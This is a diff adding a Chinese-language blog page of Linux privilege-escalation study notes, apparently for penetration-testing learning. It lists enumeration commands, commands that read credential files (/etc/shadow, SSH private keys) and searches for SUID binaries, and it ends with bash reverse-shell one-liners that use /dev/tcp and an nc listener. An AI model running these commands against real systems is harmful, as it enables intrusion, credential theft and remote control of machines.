@@ -1,0 +1,1261 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 8.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>内网：Linux提权 - Myblog</title>
+
+  
+    <meta name="description" content="Linux提权基础知识信息收集操作系统| plain uname -a    				# 打印所有可用的系统信息 uname -r    				# 内核版本 uname -n    				# 系统主机名。 uname -m    				# 查看系统内核架构（64位&#x2F;32位） uname -mrs    				# 查看系统内核架构（64位&#x2F;32位） hostname    				# 系统主">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Linux提权">
+<meta property="og:url" content="https://cbbzx12.github.io/wiki/%E5%86%85%E7%BD%91/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/">
+<meta property="og:site_name" content="Myblog">
+<meta property="og:description" content="Linux提权基础知识信息收集操作系统| plain uname -a    				# 打印所有可用的系统信息 uname -r    				# 内核版本 uname -n    				# 系统主机名。 uname -m    				# 查看系统内核架构（64位&#x2F;32位） uname -mrs    				# 查看系统内核架构（64位&#x2F;32位） hostname    				# 系统主">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cbbzx12.github.io/img/Cox7JkxS9VkQluZG/1763386674993-47c09a31-0a67-4eb5-beac-512f58af3769-730063.jpeg">
+<meta property="og:image" content="https://cbbzx12.github.io/img/Cox7JkxS9VkQluZG/1763386675081-40be7c6e-ab51-411e-9362-da53f429aabc-909467.jpeg">
+<meta property="og:image" content="https://cbbzx12.github.io/img/Cox7JkxS9VkQluZG/1763386675097-adcf53ea-9892-4d14-978d-77893c2b906c-576931.jpeg">
+<meta property="og:image" content="https://cbbzx12.github.io/img/Cox7JkxS9VkQluZG/1763386675072-3f869588-528f-4d36-aec7-1426f1e4f639-951921.jpeg">
+<meta property="og:image" content="https://cbbzx12.github.io/img/Cox7JkxS9VkQluZG/1763448548898-b32f3612-b75a-46f2-ad1c-b0223f883514-108120.png">
+<meta property="og:image" content="https://cbbzx12.github.io/img/Cox7JkxS9VkQluZG/1763448548984-a05ab778-3323-4fa6-b2aa-6f226624aee2-376859.png">
+<meta property="og:image" content="https://cbbzx12.github.io/img/Cox7JkxS9VkQluZG/1763448550415-ba11b062-4678-4b66-84f2-0fd630982498-565626.png">
+<meta property="og:image" content="https://cbbzx12.github.io/img/Cox7JkxS9VkQluZG/1763448548976-b1f7fd36-ee5a-489f-a381-624848aba3a6-340053.png">
+<meta property="og:image" content="https://cbbzx12.github.io/img/Cox7JkxS9VkQluZG/1763449838343-fbced33d-5ec3-4b0a-954d-f77facd25f00-550418.png">
+<meta property="og:image" content="https://cbbzx12.github.io/img/Cox7JkxS9VkQluZG/1763450254700-91306428-9a8b-418c-a51a-e6e49b16f187-374886.png">
+<meta property="og:image" content="https://cbbzx12.github.io/img/Cox7JkxS9VkQluZG/1763450254841-a7af9637-0737-4594-90da-ae6af1e1a529-340304.png">
+<meta property="og:image" content="https://cbbzx12.github.io/img/Cox7JkxS9VkQluZG/1763469815533-443f9460-93b9-4ad6-851a-12cf3198e6ec-831672.png">
+<meta property="og:image" content="https://cbbzx12.github.io/img/Cox7JkxS9VkQluZG/1763469882774-d43ecb36-8e67-4d06-b585-5927978cd005-451138.png">
+<meta property="article:published_time" content="2025-12-23T06:06:32.627Z">
+<meta property="article:modified_time" content="2025-12-23T06:06:32.627Z">
+<meta property="article:author" content="bug_001">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cbbzx12.github.io/img/Cox7JkxS9VkQluZG/1763386674993-47c09a31-0a67-4eb5-beac-512f58af3769-730063.jpeg">
+  
+  
+  
+  
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Website","@id":"https://cbbzx12.github.io/wiki/%E5%86%85%E7%BD%91/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/","author":{"@type":"Person","name":"bug_001","sameAs":[]},"name":"Linux提权","description":"Linux提权基础知识信息收集操作系统| plain uname -a    \t\t\t\t# 打印所有可用的系统信息 uname -r    \t\t\t\t# 内核版本 uname -n    \t\t\t\t# 系统主机名。 uname -m    \t\t\t\t# 查看系统内核架构（64位/32位） uname -mrs    \t\t\t\t# 查看系统内核架构（64位/32位） hostname    \t\t\t\t# ...","url":"https://cbbzx12.github.io/wiki/%E5%86%85%E7%BD%91/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/"}</script>
+  
+</head>
+<body><div class="sitebg"><div class="siteblur"></div></div>
+
+
+
+<div class="l_body content" id="start" layout="page" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="undefined" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Myblog</div><div class="sub cap">录一些学习过程</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item" title="博客" href="/" style="color:#1BCDFC"><img no-lazy src="https://api.iconify.design/solar/home-2-bold-duotone.svg?color=%231BCDFC" / onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="nav-item active" title="文档" href="/wiki/" style="color:#3DC550"><img no-lazy src="https://api.iconify.design/solar/notebook-bookmark-bold-duotone.svg?color=%233DC550" / onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="nav-item" title="导航" href="/sites/" style="color:#FA6400"><img no-lazy src="https://api.iconify.design/solar/planet-bold-duotone.svg?color=%23FA6400" / onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><img no-lazy src="https://api.iconify.design/solar/users-group-two-rounded-bold-duotone.svg?color=%23F44336" / onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" data-filter="/wiki/内网/" placeholder="在 /wiki/内网/ 中搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+
+
+
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/wiki/%E7%AC%94%E8%AE%B0/%E8%AE%A1%E5%88%92B/"><span class="title"><strong>笔记</strong><span class="dot"></span>计划B</span></a><a class="item title" href="/wiki/%E7%AC%94%E8%AE%B0/%E8%AE%A1%E5%88%92/"><span class="title"><strong>笔记</strong><span class="dot"></span>计划</span></a><a class="item title" href="/wiki/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"><span class="title"><strong>笔记</strong><span class="dot"></span>网络安全</span></a><a class="item title" href="/wiki/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C/"><span class="title"><strong>笔记</strong><span class="dot"></span>网络</span></a><a class="item title" href="/wiki/%E7%AC%94%E8%AE%B0/linux%E5%AD%A6%E4%B9%A0/"><span class="title"><strong>笔记</strong><span class="dot"></span>linux学习</span></a><a class="item title" href="/wiki/%E7%AC%94%E8%AE%B0/JS%E6%B8%97%E9%80%8F/"><span class="title"><strong>笔记</strong><span class="dot"></span>JS渗透</span></a><a class="item title" href="/wiki/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"><span class="title"><strong>内网</strong><span class="dot"></span>权限维持</span></a><a class="item title" href="/wiki/%E5%86%85%E7%BD%91/%E6%8F%90%E6%9D%83/Win_%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><span class="title"><strong>内网</strong><span class="dot"></span>Win_信息收集</span></a><a class="item title" href="/wiki/%E5%86%85%E7%BD%91/%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83/"><span class="title"><strong>内网</strong><span class="dot"></span>windows提权</span></a><a class="item title" href="/wiki/%E5%86%85%E7%BD%91/%E6%8F%90%E6%9D%83/Mimikatz%E6%95%99%E7%A8%8B/"><span class="title"><strong>内网</strong><span class="dot"></span>Mimikatz教程</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+
+  <span class="sep"></span>
+  <a class="cap breadcrumb" href="/wiki/%E5%86%85%E7%BD%91/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/">Linux提权</a>
+  </div>
+<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-12-23T06:06:32.627Z">2025-12-23</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>Linux提权</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a><font style="color:rgb(85, 85, 85);">操作系统</font></h3><p>| <code>plain uname -a    				# 打印所有可用的系统信息 uname -r    				# 内核版本 uname -n    				# 系统主机名。 uname -m    				# 查看系统内核架构（64位/32位） uname -mrs    				# 查看系统内核架构（64位/32位） hostname    				# 系统主机名 cat /proc/version    		# 内核信息 cat /etc/*-release   		# 分发信息 cat /etc/issue       		# 分发信息 cat /proc/cpuinfo    		# CPU信息 cat /etc/lsb-release		# Debian based cat /etc/redhat-release		# Redhat based ls /boot | grep vmlinuz-	# 内核版本 </code>  |<br>| — |</p>
+<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a><font style="color:rgb(85, 85, 85);">环境变量</font></h3><table>
+<thead>
+<tr>
+<th><code>plain env        					# 显示环境变量 set        					# 现实环境变量 echo %PATH 					# 路径信息 history    					# 显示当前用户的历史命令记录 pwd        					# 输出工作目录 cat /etc/profile   			# 显示默认系统变量 cat /etc/shells    			# 显示可用的shellrc cat /etc/bashrc cat ~/.bash_profile cat ~/.bashrc cat ~/.bash_logout cat /proc/??/environ		# ??表示两个符号 </code></th>
+</tr>
+</thead>
+</table>
+<h3 id="打印机服务"><a href="#打印机服务" class="headerlink" title="打印机服务"></a><font style="color:rgb(85, 85, 85);">打印机服务</font></h3><table>
+<thead>
+<tr>
+<th><code>plain lpstat -a </code></th>
+</tr>
+</thead>
+</table>
+<h3 id="用户和群组"><a href="#用户和群组" class="headerlink" title="用户和群组"></a><font style="color:rgb(85, 85, 85);">用户和群组</font></h3><p>| <code>plain cat /etc/passwd     		# 列出系统上的所有用户 cat /var/mail/root cat /var/spool/mail/root cat /etc/group      		# 列出系统上的所有组 grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#39;$3 == 0 { print $1}&#39;      # 列出所有的超级用户账户 whoami              		# 查看当前用户 w                   		# 谁目前已登录，他们正在做什么 last                		# 最后登录用户的列表 lastlog             		# 所有用户上次登录的信息 lastlog –u %username%  		# 有关指定用户上次登录的信息 lastlog |grep -v &quot;Never&quot;  	# 以前登录用户的完整信息 </code>  |<br>| — |</p>
+<h3 id="用户权限信息"><a href="#用户权限信息" class="headerlink" title="用户权限信息"></a><font style="color:rgb(85, 85, 85);">用户权限信息</font></h3><table>
+<thead>
+<tr>
+<th><code>plain whoami        当前用户名 id            当前用户信息 cat /etc/sudoers  谁被允许以root身份执行 sudo -l       当前用户可以以root身份执行操作 </code></th>
+</tr>
+</thead>
+</table>
+<h3 id="进程和服务"><a href="#进程和服务" class="headerlink" title="进程和服务"></a><font style="color:rgb(85, 85, 85);">进程和服务</font></h3><table>
+<thead>
+<tr>
+<th><code>plain ps aux ps -ef top cat /etc/services </code></th>
+</tr>
+</thead>
+</table>
+<p><font style="color:rgb(85, 85, 85);">查看以 root 运行的进程</font></p>
+<p>| <code>plain ps aux | grep root ps -ef | grep root </code>  |<br>| — |</p>
+<h3 id="查看安装的软件"><a href="#查看安装的软件" class="headerlink" title="查看安装的软件"></a><font style="color:rgb(85, 85, 85);">查看安装的软件</font></h3><table>
+<thead>
+<tr>
+<th><code>plain ls -alh /usr/bin/ ls -alh /sbin/ ls -alh /var/cache/yum/ dpkg -l </code></th>
+</tr>
+</thead>
+</table>
+<h3 id="服务-插件"><a href="#服务-插件" class="headerlink" title="服务&#x2F;插件"></a><font style="color:rgb(85, 85, 85);">服务&#x2F;插件</font></h3><p><font style="color:rgb(85, 85, 85);">检查有没有不安全的服务配置，和一些有漏洞的插件。</font></p>
+<p>| <code>plain cat /etc/syslog.conf cat /etc/chttp.conf cat /etc/lighttpd.conf cat /etc/cups/cupsd.conf cat /etc/inetd.conf cat /etc/apache2/apache2.conf cat /etc/my.conf cat /etc/httpd/conf/httpd.conf cat /opt/lampp/etc/httpd.conf ls -aRl /etc/ | awk &#39;$1 ~ /^.*r.*/ </code>  |<br>| — |</p>
+<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a><font style="color:rgb(85, 85, 85);">计划任务</font></h3><p>| <code>plain crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root </code>  |<br>| — |</p>
+<h3 id="有无明文存放用户密码"><a href="#有无明文存放用户密码" class="headerlink" title="有无明文存放用户密码"></a><font style="color:rgb(85, 85, 85);">有无明文存放用户密码</font></h3><p>| <code>plain grep -i user [filename] grep -i pass [filename] grep -C 5 &quot;password&quot; [filename] find , -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; </code>  |<br>| — |</p>
+<p><font style="color:rgb(102, 102, 102);">比如说可能使用邮件明文传输密码；</font></p>
+<p><font style="color:rgb(102, 102, 102);">又或者说 MySQL 中明文存放用户密码。</font></p>
+<h3 id="有无-ssh-私钥"><a href="#有无-ssh-私钥" class="headerlink" title="有无 ssh 私钥"></a><font style="color:rgb(85, 85, 85);">有无 ssh 私钥</font></h3><table>
+<thead>
+<tr>
+<th><code>plain cat ~/.ssh/authorized_keys cat ~/.ssh/identity.pub cat ~/.ssh/identity cat ~/.ssh/id_rsa.pub cat ~/.ssh/id_rsa cat ~/.ssh/id_dsa.pub cat ~/.ssh/id_dsa cat /etc/ssh/ssh_config cat /etc/ssh/sshd_config cat /etc/ssh/ssh_host_dsa_key.pub cat /etc/ssh/ssh_host_dsa_key cat /etc/ssh/ssh_host_rsa_key.pub cat /etc/ssh/ssh_host_rsa_key cat /etc/ssh/ssh_host_key.pub cat /etc/ssh/ssh_host_key </code></th>
+</tr>
+</thead>
+</table>
+<h3 id="查看与当前机器通信的其他用户或者主机"><a href="#查看与当前机器通信的其他用户或者主机" class="headerlink" title="查看与当前机器通信的其他用户或者主机"></a><font style="color:rgb(85, 85, 85);">查看与当前机器通信的其他用户或者主机</font></h3><p>| <code>plain lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w </code>  |<br>| — |</p>
+<h3 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a><font style="color:rgb(85, 85, 85);">日志文件</font></h3><table>
+<thead>
+<tr>
+<th><code>plain cat /var/log/boot.log cat /var/log/cron cat /var/log/syslog cat /var/log/wtmp cat /var/run/utmp cat /etc/httpd/logs/access_log cat /etc/httpd/logs/access.log cat /etc/httpd/logs/error_log cat /etc/httpd/logs/error.log cat /var/log/apache2/access_log cat /var/log/apache2/access.log cat /var/log/apache2/error_log cat /var/log/apache2/error.log cat /var/log/apache/access_log cat /var/log/apache/access.log cat /var/log/auth.log cat /var/log/chttp.log cat /var/log/cups/error_log cat /var/log/dpkg.log cat /var/log/faillog cat /var/log/httpd/access_log cat /var/log/httpd/access.log cat /var/log/httpd/error_log cat /var/log/httpd/error.log cat /var/log/lastlog cat /var/log/lighttpd/access.log cat /var/log/lighttpd/error.log cat /var/log/lighttpd/lighttpd.access.log cat /var/log/lighttpd/lighttpd.error.log cat /var/log/messages cat /var/log/secure cat /var/log/syslog cat /var/log/wtmp cat /var/log/xferlog cat /var/log/yum.log cat /var/run/utmp cat /var/webmin/miniserv.log cat /var/www/logs/access_log cat /var/www/logs/access.log ls -alh /var/lib/dhcp3/ ls -alh /var/log/postgresql/ ls -alh /var/log/proftpd/ ls -alh /var/log/samba/  Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp </code></th>
+</tr>
+</thead>
+</table>
+<h3 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a><font style="color:rgb(85, 85, 85);">敏感文件</font></h3><table>
+<thead>
+<tr>
+<th><code>plain cat /etc/passwd cat /etc/group cat /etc/shadow ls -alh /var/mail/ ls -ahlR /root/ ls -ahlR /home/ </code></th>
+</tr>
+</thead>
+</table>
+<h3 id="特殊的数据库、配置文件"><a href="#特殊的数据库、配置文件" class="headerlink" title="特殊的数据库、配置文件"></a><font style="color:rgb(85, 85, 85);">特殊的数据库、配置文件</font></h3><table>
+<thead>
+<tr>
+<th><code>plain cat /var/apache2/config.inc cat /var/lib/mysql/mysql/user.MYD cat /root/anaconda-ks.cfg </code></th>
+</tr>
+</thead>
+</table>
+<h3 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a><font style="color:rgb(85, 85, 85);">交互式shell</font></h3><table>
+<thead>
+<tr>
+<th><code>plain python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; echo os.system(&#39;/bin/bash&#39;) /bin/sh -i </code></th>
+</tr>
+</thead>
+</table>
+<h3 id="查看安装过的工具"><a href="#查看安装过的工具" class="headerlink" title="查看安装过的工具"></a><font style="color:rgb(85, 85, 85);">查看安装过的工具</font></h3><table>
+<thead>
+<tr>
+<th><code>plain find / -name perl* find / -name python* find / -name gcc* ... </code></th>
+</tr>
+</thead>
+</table>
+<h3 id="通讯与网络"><a href="#通讯与网络" class="headerlink" title="通讯与网络"></a><font style="color:rgb(85, 85, 85);">通讯与网络</font></h3><h4 id="系统有哪些-NIC？它是否连接到另一个网络？"><a href="#系统有哪些-NIC？它是否连接到另一个网络？" class="headerlink" title="系统有哪些 NIC？它是否连接到另一个网络？"></a><font style="color:rgb(85, 85, 85);">系统有哪些 NIC？</font><em><font style="color:rgb(85, 85, 85);">它是否连接到另一个网络？</font></em></h4><table>
+<thead>
+<tr>
+<th><code>plain /sbin/ifconfig -a cat /etc/network/interfaces cat /etc/sysconfig/network </code></th>
+</tr>
+</thead>
+</table>
+<h4 id="网络配置设置是什么？你能从这个网络中找到什么？DHCP服务器？域名服务器？网关？"><a href="#网络配置设置是什么？你能从这个网络中找到什么？DHCP服务器？域名服务器？网关？" class="headerlink" title="网络配置设置是什么？你能从这个网络中找到什么？DHCP服务器？域名服务器？网关？"></a><font style="color:rgb(85, 85, 85);">网络配置设置是什么？</font><em><font style="color:rgb(85, 85, 85);">你能从这个网络中找到什么？DHCP服务器？域名服务器？网关？</font></em></h4><table>
+<thead>
+<tr>
+<th><code>plain cat /etc/resolv.conf cat /etc/sysconfig/network cat /etc/networks iptables -L hostname dnsdomainname </code></th>
+</tr>
+</thead>
+</table>
+<h4 id="还有哪些其他用户和主机正在与系统通信？"><a href="#还有哪些其他用户和主机正在与系统通信？" class="headerlink" title="还有哪些其他用户和主机正在与系统通信？"></a><font style="color:rgb(85, 85, 85);">还有哪些其他用户和主机正在与系统通信？</font></h4><p>| <code>plain lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w </code>  |<br>| — |</p>
+<h4 id="缓存了什么？IP-和-或-MAC-地址"><a href="#缓存了什么？IP-和-或-MAC-地址" class="headerlink" title="缓存了什么？IP 和&#x2F;或 MAC 地址"></a><font style="color:rgb(85, 85, 85);">缓存了什么？</font><em><font style="color:rgb(85, 85, 85);">IP 和&#x2F;或 MAC 地址</font></em></h4><table>
+<thead>
+<tr>
+<th><code>plain arp -e route /sbin/route -nee </code></th>
+</tr>
+</thead>
+</table>
+<h4 id="数据包嗅探可能吗？能看到什么？"><a href="#数据包嗅探可能吗？能看到什么？" class="headerlink" title="数据包嗅探可能吗？能看到什么？"></a><font style="color:rgb(85, 85, 85);">数据包嗅探可能吗？能看到什么？</font></h4><table>
+<thead>
+<tr>
+<th><code>plain tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 </code></th>
+</tr>
+</thead>
+</table>
+<h3 id="可提权SUID-GUID"><a href="#可提权SUID-GUID" class="headerlink" title="可提权SUID &amp;&amp; GUID"></a><font style="color:rgba(0, 0, 0, 0.85);">可提权SUID &amp;&amp; GUID</font></h3><p><font style="color:rgb(106, 115, 125);">参考资料</font><a target="_blank" rel="noopener" href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/"><font style="color:rgb(89, 182, 215);">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</font></a></p>
+<table>
+<thead>
+<tr>
+<th><code>plain find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000)  find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # 查找 /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin 或者是 *bin 是否存在 SGID or SUID （快速搜查方式）  # 从 root (/) 开始查找是否存在 SGID or SUID, not Symbolic links, 文件夹深度为 3(可以更改), 并列出错误信息 (例如 permission denied) find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null </code></th>
+</tr>
+</thead>
+</table>
+<h3 id="查看可写-执行目录"><a href="#查看可写-执行目录" class="headerlink" title="查看可写&#x2F;执行目录"></a><font style="color:rgb(85, 85, 85);">查看可写&#x2F;执行目录</font></h3><table>
+<thead>
+<tr>
+<th><code>plain find / -writable -type d 2&gt;/dev/null      # world-writeable folders find / -perm -222 -type d 2&gt;/dev/null     # world-writeable folders find / -perm -o w -type d 2&gt;/dev/null     # world-writeable folders  find / -perm -o x -type d 2&gt;/dev/null     # world-executable folders  find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders </code></th>
+</tr>
+</thead>
+</table>
+<h3 id="proc-目录"><a href="#proc-目录" class="headerlink" title="proc 目录"></a><font style="color:rgb(85, 85, 85);">proc 目录</font></h3><p><font style="color:rgb(85, 85, 85);">Linux 系统上的</font><font style="color:rgb(85, 85, 85);"> </font><code><font style="color:rgb(68, 68, 68);">/proc</font></code><font style="color:rgb(85, 85, 85);"> </font><font style="color:rgb(85, 85, 85);">目录是一种文件系统，即 proc 文件系统。与其它常见的文件系统不同的是，</font><code><font style="color:rgb(68, 68, 68);">/proc</font></code><font style="color:rgb(85, 85, 85);"> </font><font style="color:rgb(85, 85, 85);">是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。</font></p>
+<p><font style="color:rgb(85, 85, 85);">但需要注意，部分内容需要权限才可以读取。</font></p>
+<table>
+<thead>
+<tr>
+<th><code>plain /proc/self/cmdline		# 启动当前进程的完整命令 /proc/self/cwd			# 指向当前进程运行的工作区的符号链接 /proc/self/exe			# 指向启动当前进程的可执行文件的符号链接 /proc/self/envrion		# 查看进程的环境变量 /proc/self/fd/3			# 查看读取过的文件，输入输出缓冲区 /proc/self/maps			# 内存映射信息 </code></th>
+</tr>
+</thead>
+</table>
+<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="反弹shell后获取模拟终端"><a href="#反弹shell后获取模拟终端" class="headerlink" title="反弹shell后获取模拟终端"></a><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">反弹shell后获取模拟终端</font></h2><p><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">各种方法获取的 shell 都不是一个标准的虚拟终端环境，它们只是提供了一个标准输入。你会发现存在一个问题，即使我们获得了目标虚拟终端的控制权限，但通常会遇到以下几个交互性差和不稳定的问题：</font></p>
+<ol>
+<li><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">缺乏交互性：获取的虚拟终端没有足够的交互功能。例如，我们无法为添加的账户设置密码或执行sudo等命令。</font></li>
+<li><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">无法正常显示错误输出：标准的错误输出无法显示，这导致无法正确使用一些文本编辑器（如vim）等工具。</font></li>
+<li><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">连接不稳定：获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接，这使得持续使用和进行长时间操作变得困难。</font></li>
+</ol>
+<p><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">解决上述问题的方法是使用Python的pty（pseudo terminal）标准库来获取一个标准的虚拟终端环境。通过在已经获取的shell中输入以下命令，我们可以模拟一个终端设备：</font></p>
+<table>
+<thead>
+<tr>
+<th><code>plain python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; </code></th>
+</tr>
+</thead>
+</table>
+<p><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">以上代码将调用</font><code><font style="color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);">pty.spawn()</font></code><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">函数，并将</font><code><font style="color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);">/bin/bash</font></code><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">作为参数传递给它，从而创建一个新的终端会话。</font></p>
+<p><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">通过使用这个方法，我们可以获得一个更加交互性强、可执行sudo等命令以及正确显示错误输出的标准终端环境。</font></p>
+<h2 id="bash-反弹"><a href="#bash-反弹" class="headerlink" title="bash 反弹"></a>bash 反弹</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Alice</span><br><span class="line">nc -lvvp 12345</span><br><span class="line"># Bob</span><br><span class="line">/bin/bash -c bash -i &gt;&amp; /dev/tcp/x.x.x.x/12345 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="Bash-反弹-shell-TCP"><a href="#Bash-反弹-shell-TCP" class="headerlink" title="Bash 反弹 shell TCP"></a><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">Bash 反弹 shell TCP</font></h3><table>
+<thead>
+<tr>
+<th><code>plain # Alice nc -lvvp 4242 # Bob sh -i &gt;&amp; /dev/tcp/127.0.0.1/4242 0&gt;&amp;1 </code></th>
+</tr>
+</thead>
+</table>
